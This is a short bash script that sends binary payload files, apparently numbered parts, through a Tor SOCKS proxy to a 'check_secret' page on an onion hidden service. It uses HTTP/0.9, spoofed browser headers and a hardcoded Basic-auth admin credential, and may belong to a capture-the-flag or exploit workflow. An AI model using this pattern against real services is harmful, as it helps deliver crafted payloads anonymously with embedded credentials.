#!/bin/bash
filename='@part'
filename+=$1
filename+='.bin'
curl --http0.9 --max-time 5 --socks5-hostname localhost:9050 --data-binary $filename \
    -v 'http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Content-Length: 0' -H 'Upgrade-Insecure-Requests: 1' -H 'Authorization: Basic YWRtaW46aGFtbWVydGltZQ=='
